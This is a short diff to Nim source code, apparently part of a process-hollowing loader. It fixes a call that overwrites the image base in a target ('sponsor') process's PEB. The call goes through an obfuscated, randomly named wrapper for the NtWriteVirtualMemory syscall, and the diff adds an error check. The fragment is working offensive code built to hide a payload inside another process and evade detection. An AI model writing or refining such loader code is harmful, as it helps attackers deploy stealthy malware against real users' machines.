@@ -106,14 +106,15 @@ proc writeMemoryProcess(
             quit(1)
     
     # Overwrite sponsor PEB with the new image base address 
-    echo $nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
+    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
         processHandle,
         cast[LPVOID](cast[int](sponsorPeb) + 0x10),
-        peImageImageBase,
+        unsafeAddr peImageImageBase,
         8,
         NULL
-    )
-    
+    ) != 0:
+        quit(1)
+
     # success
     quit(0)
 
